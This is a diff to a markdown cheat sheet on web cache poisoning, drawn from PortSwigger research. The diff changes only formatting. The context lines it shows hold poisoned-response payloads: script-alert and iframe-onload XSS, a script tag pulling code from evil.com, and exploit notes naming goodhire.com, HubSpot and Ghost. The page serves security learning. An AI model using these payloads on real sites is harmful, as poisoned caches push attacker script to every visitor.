@@ -1,8 +1,9 @@
 # Web Cache Poisoning
-## **Introduction**
+
+## Introduction
 The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users.
 
-## **How to Find**
+## How to FInd
 1. Basic poisoning
 ```
 GET / HTTP/1.1
@@ -29,6 +30,7 @@ Cache-Control: public, no-cache
 …
 <img href="https://a.\"><script>alert(1)</script>a.png" />
 ```
+
 2. Seizing the Cache
 ```
 GET / HTTP/1.1
@@ -45,6 +47,7 @@ Cache-Control: public, max-age=1800
 <script src="https://evil.com/x.js">
 </script>
 ```
+
 3. Selective poisoning
 ```
 GET / HTTP/1.1
@@ -60,6 +63,7 @@ Vary: User-Agent, Accept-Encoding
 …
 <link rel="canonical" href="https://a">a<iframe onload=alert(1)>
 ```
+
 4. Chaining Unkeyed Inputs 
 - First step
 ```
@@ -110,9 +114,7 @@ CF-Cache-Status: MISS
 <title>HubSpot - Page not found</title>
 <p>The domain canary does not exist in our system.</p>
 ```
-To exploit this, we
-need to go to hubspot.com, register ourselves as a HubSpot client, place a payload on our HubSpot page, and
-then finally trick HubSpot into serving this response on goodhire.com
+To exploit this, we need to go to hubspot.com, register ourselves as a HubSpot client, place a payload on our HubSpot page, and then finally trick HubSpot into serving this response on goodhire.com
 ```
 GET / HTTP/1.1
 Host: www.goodhire.com
@@ -136,9 +138,7 @@ The response is
 HTTP/1.1 302 Found
 Location: https://ghost.org/fail/
 ```
-When a user first registers a blog with Ghost, it issues them with a unique subdomain under ghost.io. Once a
-blog is up and running, the user can define an arbitrary custom domain like blog.cloudflare.com. If a user has
-defined a custom domain, their ghost.io subdomain will simply redirect to it:
+When a user first registers a blog with Ghost, it issues them with a unique subdomain under ghost.io. Once a blog is up and running, the user can define an arbitrary custom domain like blog.cloudflare.com. If a user has defined a custom domain, their ghost.io subdomain will simply redirect to it:
 ```
 GET / HTTP/1.1
 Host: blog.cloudflare.com
@@ -150,5 +150,5 @@ HTTP/1.1 302 Found
 Location: http://noshandnibble.blog/
 ```
 
-Reference:
-- [Portswigger](https://portswigger.net/research/practical-web-cache-poisoning)
+## References
+* [Portswigger](https://portswigger.net/research/practical-web-cache-poisoning)
